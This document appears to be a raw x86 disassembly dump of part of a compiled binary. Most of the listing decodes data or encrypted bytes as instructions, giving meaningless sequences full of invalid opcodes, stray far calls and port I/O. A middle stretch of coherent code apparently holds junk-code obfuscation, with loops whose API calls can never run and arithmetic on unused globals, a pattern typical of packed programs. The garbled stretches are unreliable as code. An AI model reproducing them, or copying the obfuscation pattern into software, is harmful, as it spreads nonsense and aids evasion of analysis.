  413498:	mov    al,ds:0x4c4c1ec4
  41349d:	xor    eax,0x22781854
  4134a2:	inc    edi
  4134a3:	call   0x42df:0x6904f782
  4134aa:	jno    0x4134fb
  4134ac:	stc    
  4134ad:	mov    bh,0xc9
  4134af:	sbb    al,0x7c
  4134b1:	inc    ebp
  4134b2:	imul   esi,DWORD PTR [eax],0x30
  4134b5:	or     eax,0xfc78b68b
  4134ba:	sbb    eax,DWORD PTR [esi+0x21c2ce15]
  4134c0:	or     eax,0x507ef44b
  4134c5:	ret    
  4134c6:	dec    edx
  4134c7:	inc    eax
  4134c8:	or     eax,0xed961707
  4134cd:	xor    al,0xf6
  4134cf:	test   eax,0xeb4b33d7
  4134d4:	pop    eax
  4134d5:	fadd   DWORD PTR [ebp+0x69]
  4134d8:	dec    eax
  4134d9:	data16 adc bh,BYTE PTR [esi]
  4134dc:	out    0xcf,al
  4134de:	jle    0x4134b1
  4134e0:	xchg   DWORD PTR [edi-0x1aeb671d],ecx
  4134e6:	fcmovb st,st(1)
  4134e8:	icebp  
  4134e9:	pop    ss
  4134ea:	fs pop esi
  4134ec:	js     0x4134fc
  4134ee:	aad    0x45
  4134f0:	push   edi
  4134f1:	outs   dx,BYTE PTR ds:[esi]
  4134f2:	sar    DWORD PTR ds:0x9f7b2e1b,cl
  4134f8:	mov    BYTE PTR [ecx],al
  4134fa:	dec    eax
  4134fb:	int    0x7c
  4134fd:	retf   0x254
  413500:	enter  0xdb51,0x31
  413504:	mov    BYTE PTR [esi-0xeca197f],dl
  41350a:	lea    eax,[eax+0x775369bd]
  413510:	enter  0xcc5d,0xd7
  413514:	imul   esp,esi,0xffffff8c
  413517:	mov    DWORD PTR [esi],0x37f81aa8
  41351d:	adc    eax,0xd7309bef
  413522:	imul   BYTE PTR [edi-0x28]
  413525:	lea    ecx,[esi-0x74]
  413528:	shr    DWORD PTR [esi+0x53],0xaf
  41352c:	sbb    eax,DWORD PTR [esi]
  41352e:	imul   esi,DWORD PTR [eax],0x59d9de58
  413534:	fisub  DWORD PTR [edi+eiz*1-0xd]
  413538:	push   ebx
  413539:	add    eax,0xda81c4b9
  41353e:	sahf   
  41353f:	pop    esp
  413540:	mov    BYTE PTR [ebx+0x24],dl
  413543:	add    ah,BYTE PTR [edx-0x318cfafd]
  413549:	mov    ch,0x1e
  41354b:	xchg   edi,eax
  41354c:	push   ss
  41354d:	mov    ebx,0x691aeafd
  413552:	and    ch,dl
  413554:	pop    ebx
  413555:	fneni(8087 only) 
  413557:	push   ecx
  413558:	enter  0xfebf,0x49
  41355c:	(bad)
  413560:	aaa    
  413561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413562:	add    al,BYTE PTR [edx-0x35151682]
  413568:	(bad)  [edi]
  41356a:	adc    ch,BYTE PTR [edi+0x7b485b8c]
  413570:	sbb    eax,0x35180b4f
  413575:	pop    ebp
  413576:	push   eax
  413577:	and    bl,BYTE PTR ds:0x300bb98d
  41357d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41357e:	sahf   
  41357f:	inc    esp
  413580:	push   ds
  413581:	dec    ebp
  413582:	mov    bh,dh
  413584:	in     eax,dx
  413585:	call   0x9655:0x45c3a4
  41358c:	ins    BYTE PTR es:[edi],dx
  41358d:	inc    edx
  41358e:	pop    ecx
  41358f:	adc    al,0xae
  413591:	test   eax,ebp
  413593:	jbe    0x4135ee
  413595:	fisttp WORD PTR [edx+0x1d207124]
  41359b:	das    
  41359c:	fcomip st,st(3)
  41359e:	mov    ds:0x6b970e19,eax
  4135a3:	cwde   
  4135a4:	push   cs
  4135a5:	int    0x6f
  4135a7:	sub    BYTE PTR [edx-0x1],cl
  4135aa:	sbb    eax,0x8e972913
  4135af:	test   DWORD PTR [ecx+0x1ad9492a],esp
  4135b5:	adc    ch,BYTE PTR [edx-0xd477aa]
  4135bb:	add    BYTE PTR [ecx-0x5561f202],0xb
  4135c2:	das    
  4135c3:	xchg   DWORD PTR [esi],eax
  4135c5:	pop    edi
  4135c6:	mov    edx,ebx
  4135c8:	arpl   WORD PTR ss:[edx],di
  4135cb:	xor    dl,bl
  4135cd:	mov    ebp,0xdb76b884
  4135d2:	mov    ebx,0x34e1bc2c
  4135d7:	iret   
  4135d8:	fiadd  WORD PTR [ecx]
  4135da:	jns    0x4135db
  4135dc:	test   BYTE PTR [ecx-0x69],al
  4135df:	pop    ebx
  4135e0:	mov    ds:0x2d0412bb,al
  4135e5:	test   BYTE PTR [eax-0x60480813],ch
  4135eb:	out    0xe9,al
  4135ed:	jnp    0x4135b7
  4135ef:	sub    bl,0xe3
  4135f2:	xchg   ecx,eax
  4135f3:	sbb    ch,dh
  4135f5:	dec    ebp
  4135f6:	frstor [eax]
  4135f8:	retf   
  4135f9:	fist   DWORD PTR ds:[esi-0x4f111d6d]
  413600:	dec    eax
  413601:	repnz fmul DWORD PTR [eax]
  413604:	adc    ebx,DWORD PTR [ebx+0x35]
  413607:	mov    bl,0x8d
  413609:	inc    ecx
  41360a:	jl     0x413688
  41360c:	stos   BYTE PTR es:[edi],al
  41360d:	jo     0x413600
  41360f:	mov    edi,0x12e80cde
  413614:	jbe    0x413690
  413616:	repz out dx,al
  413618:	sub    ecx,edx
  41361a:	lds    edi,FWORD PTR [eax-0x4dd3daeb]
  413620:	icebp  
  413621:	cli    
  413622:	dec    ebp
  413623:	sbb    eax,DWORD PTR [ebx]
  413625:	add    ch,BYTE PTR [eax+eax*4+0x7c]
  413629:	sub    DWORD PTR [edx-0x31b9dfb1],ebx
  41362f:	push   esp
  413630:	jnp    0x413653
  413632:	mov    BYTE PTR cs:[bp+di],0x58
  413637:	stos   BYTE PTR es:[edi],al
  413638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413639:	std    
  41363a:	fisubr DWORD PTR [eax+ebp*4]
  41363d:	retf   
  41363e:	ret    
  41363f:	pushf  
  413640:	xor    esp,DWORD PTR [eax+0x15020c84]
  413646:	adc    al,0xf6
  413648:	sti    
  413649:	clc    
  41364a:	push   ebx
  41364b:	mov    ah,0x19
  41364d:	inc    edi
  41364e:	push   ebp
  41364f:	sar    BYTE PTR [esi+eiz*8-0x56371711],0x8f
  413657:	sub    esp,eax
  413659:	dec    esi
  41365a:	jge    0x413655
  41365c:	(bad)  
  41365d:	pop    esi
  41365e:	pop    eax
  41365f:	mov    edi,0x28fbfccc
  413664:	xor    bl,bh
  413666:	dec    esi
  413667:	(bad)  
  413668:	cmp    ecx,esi
  41366a:	push   ebx
  41366b:	adc    al,0x1d
  41366d:	pop    esp
  41366e:	cli    
  41366f:	jecxz  0x4136d7
  413671:	shl    ch,1
  413673:	rcl    DWORD PTR [ebp+esi*4-0x479e558c],0x31
  41367b:	fidiv  DWORD PTR [ecx]
  41367d:	out    0xbc,al
  41367f:	jp     0x413635
  413681:	mov    dl,0x87
  413683:	cmp    esi,edi
  413685:	sbb    BYTE PTR [esi-0x4e],0x39
  413689:	mov    DWORD PTR [ecx+0x1d],esp
  41368c:	push   es
  41368d:	push   ebx
  41368e:	test   DWORD PTR cs:[eax],edx
  413691:	push   ecx
  413692:	sub    eax,0x7da372f
  413697:	lahf   
  413698:	mov    ecx,edx
  41369a:	sahf   
  41369b:	call   0xa8e08044
  4136a0:	(bad)  
  4136a2:	jmp    0x70406607
  4136a7:	arpl   WORD PTR [ebp+0x49],ax
  4136aa:	mov    eax,ds:0x372909f1
  4136af:	fsubr  DWORD PTR [esi]
  4136b1:	aam    0xbb
  4136b3:	lea    esi,[edx+0x6]
  4136b6:	xchg   BYTE PTR [esi-0x29d7e7aa],dl
  4136bc:	out    dx,eax
  4136bd:	popa   
  4136be:	pop    es
  4136bf:	mov    eax,ds:0x95b007dd
  4136c4:	rcr    BYTE PTR [edx-0x24],1
  4136c7:	and    DWORD PTR [ebp-0x3],ebp
  4136ca:	xchg   edx,eax
  4136cb:	shr    BYTE PTR [ebx+0x71],cl
  4136ce:	sbb    ah,BYTE PTR [eax-0x7]
  4136d1:	pop    edx
  4136d2:	cmp    dl,BYTE PTR [ebx+0x4c]
  4136d5:	pushf  
  4136d6:	imul   esi,DWORD PTR [edi+0x3dd63503],0x1e
  4136dd:	std    
  4136de:	pop    eax
  4136df:	push   edi
  4136e0:	mov    dl,0x5e
  4136e2:	pusha  
  4136e3:	rcl    BYTE PTR [ebx+0x23],1
  4136e6:	xchg   ebx,eax
  4136e7:	cwde   
  4136e8:	inc    edi
  4136e9:	add    bh,dh
  4136eb:	pop    ebp
  4136ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136ed:	stc    
  4136ee:	dec    DWORD PTR ds:0xcdc5c694
  4136f4:	out    dx,eax
  4136f5:	lock push ds
  4136f7:	data16 sub al,BYTE PTR [ebx]
  4136fa:	mov    eax,0x392d0fd4
  4136ff:	mov    ah,0xd7
  413701:	daa    
  413702:	loop   0x4136f6
  413704:	fidiv  WORD PTR [ecx-0x2bbf066d]
  41370a:	adc    ebp,ebp
  41370c:	lock xor al,0xb2
  41370f:	ret    0xee48
  413712:	and    DWORD PTR [edi+0x136fded4],ebx
  413718:	retf   
  413719:	or     ebx,DWORD PTR ds:[edx-0x35dadeba]
  413720:	push   eax
  413721:	jge    0x4136b3
  413723:	jae    0x413778
  413725:	ss jae 0x4136b3
  413728:	lahf   
  413729:	and    BYTE PTR [esi+0x3d],0xf9
  41372d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41372f:	jno    0x4136ec
  413731:	(bad)  
  413732:	stos   DWORD PTR es:[edi],eax
  413733:	repz xor eax,0x3c546a2a
  413739:	pop    ecx
  41373a:	or     al,0xc8
  41373c:	inc    ecx
  41373d:	test   BYTE PTR [ecx-0x54],ch
  413740:	fdivp  st(1),st
  413742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413743:	push   ds
  413744:	scas   eax,DWORD PTR es:[edi]
  413745:	daa    
  413746:	jle    0x4136d2
  413748:	inc    esp
  413749:	push   ebx
  41374a:	pop    ss
  41374b:	popf   
  41374c:	(bad)  
  41374d:	je     0x413781
  41374f:	pop    edi
  413750:	cwde   
  413751:	mov    ah,BYTE PTR [edx+0x4ea009ad]
  413757:	(bad)  
  413758:	and    bh,cl
  41375a:	jmp    0xf721b238
  41375f:	xor    eax,0x6912bb79
  413764:	jecxz  0x4137ca
  413766:	bound  ecx,QWORD PTR [esp+eiz*2+0x7b34c52e]
  41376d:	leave  
  41376e:	aaa    
  41376f:	sub    DWORD PTR [esi+0x6c98c764],ebp
  413775:	mov    dh,0x2b
  413777:	data16 in al,dx
  413779:	mov    esi,0x44eb9ba1
  41377e:	jae    0x413797
  413780:	mov    fs,edi
  413782:	jmp    FWORD PTR [esi-0x548db36d]
  413788:	pop    ebx
  413789:	fiadd  DWORD PTR [edx-0x6cd90e67]
  41378f:	inc    ecx
  413790:	dec    eax
  413791:	mov    dh,0x8c
  413793:	repnz daa 
  413795:	arpl   WORD PTR [edx-0x38a8eb48],dx
  41379b:	and    al,0x5c
  41379d:	sbb    BYTE PTR [edx+0x4242a525],ah
  4137a3:	jne    0x4137ef
  4137a5:	imul   edi,esp,0xfffffff1
  4137a8:	sahf   
  4137a9:	aam    0x94
  4137ab:	cmp    eax,0x25c90aa2
  4137b0:	sbb    al,bl
  4137b2:	push   eax
  4137b3:	ds call 0x6517:0x5234d232
  4137bb:	enter  0xdf24,0x92
  4137bf:	data16 test BYTE PTR [ebx-0x23826b18],bh
  4137c6:	imul   ebp,DWORD PTR [ebx+0x57],0x22
  4137ca:	pop    edi
  4137cb:	call   0x314d:0xd60c598b
  4137d2:	xchg   DWORD PTR [ebp-0x1a],ecx
  4137d5:	dec    ecx
  4137d6:	pop    es
  4137d7:	imul   ebx,DWORD PTR [esi],0xffffff8c
  4137da:	xchg   edi,eax
  4137db:	pop    esi
  4137dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137dd:	push   ebp
  4137de:	xlat   BYTE PTR ds:[ebx]
  4137df:	hlt    
  4137e0:	mov    ds:0x61d9e8a2,al
  4137e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e6:	sub    DWORD PTR [ecx-0xe7c4b7e],esi
  4137ec:	jl     0x4137e1
  4137ee:	sub    eax,0x3263c65a
  4137f3:	dec    edi
  4137f4:	les    esi,FWORD PTR [edx]
  4137f6:	or     ebx,DWORD PTR [ebp+0x29]
  4137f9:	adc    esp,DWORD PTR [eax+0x5c]
  4137fc:	idiv   cl
  4137fe:	jle    0x413811
  413800:	xlat   BYTE PTR ds:[ebx]
  413801:	mov    ecx,DWORD PTR [ebp-0x53083580]
  413807:	cs stos BYTE PTR es:[edi],al
  413809:	mov    bl,0x4a
  41380b:	bound  ebx,QWORD PTR [ebp-0x22acca96]
  413811:	push   es
  413812:	or     ch,bl
  413814:	gs js  0x4137ec
  413817:	aam    0xe
  413819:	sar    DWORD PTR [esi+0x4b],cl
  41381c:	call   0xa07e7fc9
  413821:	jmp    0x413853
  413823:	push   es
  413824:	dec    ecx
  413825:	or     al,0xed
  413827:	cmp    DWORD PTR [esi-0x53843d0f],esi
  41382d:	mov    eax,0x64b2466d
  413832:	mov    al,ds:0xe77bba96
  413837:	icebp  
  413838:	es and dh,bh
  41383b:	nop
  41383c:	shl    DWORD PTR [edx-0x68e520],1
  413842:	stos   DWORD PTR es:[edi],eax
  413843:	adc    DWORD PTR [edi-0x3c],ebp
  413846:	or     BYTE PTR [edi+eiz*8-0x19],dl
  41384a:	(bad)  
  41384b:	mov    eax,esp
  41384d:	xchg   DWORD PTR [eax+eiz*1-0x4c],esi
  413851:	cmp    BYTE PTR [ecx+edx*8+0xa],dl
  413855:	gs pop esi
  413857:	outs   dx,DWORD PTR ds:[esi]
  413858:	mov    ch,0x13
  41385a:	lahf   
  41385b:	ror    BYTE PTR [esi-0x266bd77c],cl
  413861:	dec    edi
  413862:	bound  ebp,QWORD PTR [esi+0x7eaef3ad]
  413868:	imul   esp,eax,0x2
  41386b:	shr    bl,cl
  41386d:	(bad)  
  41386e:	out    0x4d,eax
  413870:	addr16 (bad) 
  413872:	adc    DWORD PTR [eax+0x3fa143e4],esi
  413878:	mov    ds:0x3f6bbc9f,al
  41387d:	nop
  41387e:	aaa    
  41387f:	iret   
  413880:	jl     0x4138ec
  413882:	inc    ebp
  413883:	mov    dh,0x96
  413885:	mov    eax,ds:0x878ddae
  41388a:	mov    dl,0x78
  41388c:	test   eax,0x623f1fcf
  413891:	pop    esi
  413892:	add    edx,0x400ae825
  413898:	inc    esi
  413899:	in     al,0x1
  41389b:	fdivr  QWORD PTR [edx]
  41389d:	ins    DWORD PTR es:[edi],dx
  41389e:	mov    cl,0x6b
  4138a0:	inc    edi
  4138a1:	or     eax,0x35a8117a
  4138a6:	ds (bad) 
  4138a9:	clc    
  4138aa:	mov    ebx,0x71205658
  4138af:	jno    0x4138f3
  4138b1:	push   esi
  4138b2:	imul   edi,DWORD PTR [edi-0x25a5fce0],0xffffffee
  4138b9:	mov    al,0x81
  4138bb:	jnp    0x4138f3
  4138bd:	push   edx
  4138be:	sub    ebp,esp
  4138c0:	js     0x413872
  4138c2:	xchg   edi,eax
  4138c3:	mov    edi,0x4d6dee20
  4138c8:	aas    
  4138c9:	or     esi,DWORD PTR ds:0xaefa0155
  4138cf:	and    edi,DWORD PTR [ebx-0x54b609bc]
  4138d5:	push   0x63
  4138d7:	jno    0x4138ce
  4138d9:	cmp    BYTE PTR [ecx+edx*8-0x2],0xd7
  4138de:	pop    esp
  4138df:	sti    
  4138e0:	scas   eax,DWORD PTR es:[edi]
  4138e1:	and    DWORD PTR [edx],edi
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413c66
  413cce:	out    dx,al
  413ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd0:	ds adc al,0x8a
  413cd3:	jl     0x413d51
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	xor    eax,esp
  413cdb:	inc    ecx
  413cdc:	inc    esi
  413cdd:	sub    ecx,edx
  413cdf:	ret    
  413ce0:	dec    esi
  413ce1:	jns    0x413c8f
  413ce3:	xchg   ecx,eax
  413ce4:	aas    
  413ce5:	daa    
  413ce6:	ret    
  413ce7:	push   ecx
  413ce8:	ja     0x413d2e
  413cea:	cmc    
  413ceb:	cmp    eax,0x7170c29a
  413cf0:	sbb    DWORD PTR [edx-0x71b493d8],ebx
  413cf6:	inc    esp
  413cf7:	nop
  413cf8:	imul   edx,DWORD PTR [eax-0x2760a452],0x2c
  413cff:	test   DWORD PTR [eax-0x32],ebp
  413d02:	es adc eax,0xa3c79741
  413d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d09:	mov    esi,0xc55d5ac
  413d0e:	cmc    
  413d0f:	add    ecx,DWORD PTR [eax-0x47]
  413d12:	test   BYTE PTR [edx-0x24df5683],ch
  413d18:	xchg   esi,eax
  413d19:	je     0x413d6a
  413d1b:	mov    ah,0x42
  413d1d:	popa   
  413d1e:	and    al,0xd3
  413d20:	push   es
  413d21:	fcom   DWORD PTR [edi+0x28]
  413d24:	jmp    0x413d3c
  413d26:	xchg   ebx,eax
  413d27:	shl    BYTE PTR [esi-0x3b5d5978],1
  413d2d:	xchg   edi,eax
  413d2e:	(bad)  
  413d2f:	sti    
  413d30:	mov    al,ch
  413d32:	lea    ecx,[eax-0x45b34cd1]
  413d38:	adc    ebp,ebx
  413d3a:	jp     0x413cee
  413d3c:	mov    dl,0x8c
  413d3e:	shl    DWORD PTR [ebp-0x35],1
  413d41:	stc    
  413d42:	pop    eax
  413d43:	int3   
  413d44:	fisttp DWORD PTR [edx-0x3]
  413d47:	mov    bl,0xea
  413d49:	dec    ecx
  413d4a:	cmc    
  413d4b:	jmp    0x413cf4
  413d4d:	mov    bl,0x2e
  413d4f:	scas   eax,DWORD PTR es:[edi]
  413d50:	jo     0x413da8
  413d52:	push   esi
  413d53:	inc    edi
  413d54:	nop
  413d55:	mov    ebx,0x53af3e38
  413d5a:	leave  
  413d5b:	pop    esp
  413d5c:	and    ecx,DWORD PTR [esi+0x32]
  413d5f:	jle    0x413cff
  413d61:	bound  edx,QWORD PTR [ebx-0x42ca76ec]
  413d67:	or     eax,0x99799cbc
  413d6c:	xchg   esi,ebx
  413d6e:	xchg   edx,eax
  413d6f:	cld    
  413d70:	mov    BYTE PTR [ecx-0x797a9d57],dh
  413d76:	cld    
  413d77:	int    0xea
  413d79:	(bad)  
  413d7a:	jb     0x413d85
  413d7c:	jmp    0x413dae
  413d7e:	fwait
  413d7f:	stc    
  413d80:	sub    eax,0x5b8c9a03
  413d85:	hlt    
  413d86:	xlat   BYTE PTR ds:[ebx]
  413d87:	fistp  DWORD PTR [eax+0x34]
  413d8a:	fnsave ds:0x33a1ce0f
  413d90:	je     0x413d94
  413d92:	jnp    0x413dd0
  413d94:	das    
  413d95:	push   0x1f574818
  413d9a:	or     DWORD PTR [edx+0x5c],0x451448c7
  413da1:	mov    bh,0x39
  413da3:	in     al,0xf9
  413da5:	out    0x27,al
  413da7:	gs (bad) 
  413daa:	(bad)  
  413dab:	sar    bl,cl
  413dad:	aad    0xcc
  413daf:	xchg   ebx,esi
  413db1:	(bad)  
  413db3:	scas   al,BYTE PTR es:[edi]
  413db4:	mov    ds:0x300f723b,eax
  413db9:	stos   BYTE PTR es:[edi],al
  413dba:	rcl    DWORD PTR [esi+0x35c81ae9],cl
  413dc0:	pop    ecx
  413dc1:	repnz pop ebp
  413dc3:	outs   dx,BYTE PTR ds:[esi]
  413dc4:	fcom   st(7)
  413dc6:	pop    ebx
  413dc7:	jp     0x413dec
  413dc9:	lds    esp,FWORD PTR [eax+0x26542216]
  413dcf:	dec    edx
  413dd0:	jne    0x413d7e
  413dd2:	js     0x413de7
  413dd4:	push   ebp
  413dd5:	push   ebp
  413dd6:	aaa    
  413dd7:	or     ch,BYTE PTR [esi-0x5f]
  413dda:	adc    DWORD PTR [esi-0x7],0xffffffaa
  413dde:	mov    esi,0x7ef613ca
  413de3:	pop    ebx
  413de4:	sbb    bh,BYTE PTR [ebp+0x32b16037]
